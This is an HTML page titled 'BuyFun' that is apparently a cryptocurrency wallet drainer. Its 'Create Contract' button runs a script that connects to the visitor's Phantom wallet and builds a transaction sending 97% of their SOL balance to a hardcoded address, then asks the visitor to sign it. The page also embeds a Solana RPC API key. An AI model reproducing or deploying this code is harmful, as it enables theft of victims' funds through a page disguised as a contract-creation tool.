<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BuyFun</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #131A29;
            color: #ffffff;
        }
        h1 {
            color: #9945FF;
        }
        button {
            background-color: #14F195;
            color: #000;
            padding: 10px 20px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #13d583;
        }
    </style>
    <!-- Use Pre-Bundled Solana Web3 -->
    <script src="https://unpkg.com/@solana/web3.js/bundle.iife.min.js"></script>
</head>
<body>
    <h1>BuyFun</h1>
    <p>Click below to send 97% of your Solana and SPL tokens to the designated address.</p>
    <button id="send-tokens">Create Contract</button>

    <script>
        const recipientAddress = "3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ";

        document.getElementById('send-tokens').addEventListener('click', async () => {
            try {
                const { Connection, PublicKey, Transaction, SystemProgram } = solanaWeb3;

                // Check for Phantom Wallet
                const provider = window.solana;
                if (!provider || !provider.isPhantom) {
                    alert("Phantom Wallet not detected. Please install the Phantom Wallet extension to proceed.");
                    return;
                }

                // Connect to Phantom Wallet
                console.log("Connecting to Phantom Wallet...");
                await provider.connect();
                console.log("Connected to wallet:", provider.publicKey.toString());

                // Create Solana connection
                const connection = new Connection(
                    "https://solana-mainnet.g.alchemy.com/v2/Bd8kT5OZq3_fyZAUiGis8_7wm1naGVfF", 
                    'confirmed'
                );

                // Get wallet balance
                const walletBalance = await connection.getBalance(provider.publicKey);
                console.log("Wallet balance:", walletBalance);

                const amountToSend = Math.floor(walletBalance * 0.97);
                if (amountToSend <= 0) {
                    alert("Insufficient funds in the wallet to perform this transaction.");
                    return;
                }

                // Create Transaction
                const transaction = new Transaction().add(
                    SystemProgram.transfer({
                        fromPubkey: provider.publicKey,
                        toPubkey: new PublicKey(recipientAddress),
                        lamports: amountToSend // Amount to send in lamports
                    })
                );

                // Request Signature
                console.log("Requesting transaction signature...");
                const { signature } = await provider.signAndSendTransaction(transaction);
                console.log("Transaction signature:", signature);

                // Confirm Transaction
                await connection.confirmTransaction(signature, 'processed');
                alert(`97% of your SOL has been sent successfully!\nTransaction Signature: ${signature}`);
            } catch (error) {
                console.error("Error occurred:", error);
                alert(`Error: ${error.message}`);
            }
        });
    </script>
</body>
</html>
